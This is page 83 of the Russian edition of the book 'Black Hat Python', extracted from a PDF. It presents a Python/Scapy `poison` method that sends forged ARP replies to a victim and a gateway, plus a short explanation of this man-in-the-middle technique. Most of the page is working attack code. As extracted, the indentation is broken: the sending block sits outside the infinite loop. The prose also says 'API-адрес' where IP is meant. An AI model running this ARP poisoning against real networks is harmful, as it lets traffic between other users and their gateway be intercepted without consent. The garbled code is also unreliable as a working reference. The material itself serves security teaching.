# Black Hat Python. Программирование для хакеров и пентестеров — страница 83

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

ARP-спуфинг с использованием Scapy   83
Метод poison создает модифицированные пакеты и отправляет их жертве
и шлюзу:
def poison(self):
    poison_victim = ARP() 
    poison_victim.op = 2
    poison_victim.psrc = self.gateway
    poison_victim.pdst = self.victim
    poison_victim.hwdst = self.victimmac
    print(f'ip src: {poison_victim.psrc}')
    print(f'ip dst: {poison_victim.pdst}')
    print(f'mac dst: {poison_victim.hwdst}')
    print(f'mac src: {poison_victim.hwsrc}')
    print(poison_victim.summary())
    print('-'*30)
    poison_gateway = ARP() 
    poison_gateway.op = 2
    poison_gateway.psrc = self.victim
    poison_gateway.pdst = self.gateway
    poison_gateway.hwdst = self.gatewaymac
    print(f'ip src: {poison_gateway.psrc}')
    print(f'ip dst: {poison_gateway.pdst}')
    print(f'mac dst: {poison_gateway.hwdst}')
    print(f'mac_src: {poison_gateway.hwsrc}')
    print(poison_gateway.summary())
    print('-'*30)
    print(f'Beginning the ARP poison. [CTRL-C to stop]')
    while True: 
        sys.stdout.write('.')
        sys.stdout.flush()
    try:
        send(poison_victim)
        send(poison_gateway)
    except KeyboardInterrupt: 
        self.restore()
        sys.exit()
    else:
        time.sleep(2)
Метод poison подготавливает данные, которые мы будем использовать в ходе
атаки ARP-спуфинга на жертву и шлюз. Сначала создается модифициро-
ванный ARP-пакет, предназначенный для жертвы . Аналогично создается
ARP-пакет для шлюза . Чтобы атаковать шлюз, мы шлем ему API-адрес
жертвы и собственный MAC-адрес. Таким же образом атакуем жертву , от -
правляя ей свой MAC-адрес вместе с IP-адресом шлюза. Мы выводим всю эту
информацию в консоль, чтобы убедиться в корректности адресов назначения
и содержимого наших пакетов.
